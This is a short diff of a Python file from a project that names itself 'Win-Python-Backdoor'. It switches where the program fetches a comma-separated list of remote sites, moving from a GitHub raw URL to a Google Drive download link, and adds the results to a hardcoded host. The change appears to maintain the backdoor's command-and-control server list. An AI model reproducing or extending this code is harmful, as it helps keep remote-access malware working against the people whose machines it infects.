@@ -11,7 +11,8 @@ from subprocess import Popen
 
 import socket
 
-mainsite = urllib2.urlopen("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt")
+#mainsite = urllib2.urlopen("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt")
+mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF")
 #print mainsite.text
 sites = ["paner.altervista.org"]#, mainsite.text]
 sites.extend(mainsite.read().split(",") )
